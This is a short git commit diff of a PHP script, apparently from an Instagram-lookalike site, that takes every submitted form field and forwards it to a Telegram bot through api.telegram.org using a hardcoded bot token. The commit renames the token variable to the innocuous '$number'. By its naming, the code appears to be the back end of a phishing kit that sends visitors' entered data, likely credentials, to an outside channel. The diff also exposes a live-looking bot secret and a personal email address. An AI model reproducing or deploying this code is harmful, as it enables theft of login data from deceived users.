9cc2a0be956aedc607c838feeba020de40e95024
instagram-vidiioes-com <mansoorisohel799@gmail.com>
2024-10-27 12:45:49 +0530

    Update sendmessage.php

--- sendmessage.php
+++ sendmessage.php
@@ -8,13 +8,13 @@ $content .= "<b>$key</b>: <i>$value</i>\n";
 if(trim($content)) {
 $content = "<b>Message from Site:</b>\n".$content;
 // Your bot's token that got from @BotFather
-$apiToken = "5930698438:AAEKZKL5FqwJqPtyhxWxW60a1QaLe0cpxk0";
+$number = "5930698438:AAEKZKL5FqwJqPtyhxWxW60a1QaLe0cpxk0";
 $data = [
 // The user's(that you want to send a message) telegram chat id
 'chat_id' => '@sendd_insta_info_bot',
 'text' => $content,
 'parse_mode' => 'HTML'
 ];
-$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));
+$response = file_get_contents("https://api.telegram.org/bot$number/sendMessage?".http_build_query($data));
 }
 ?>
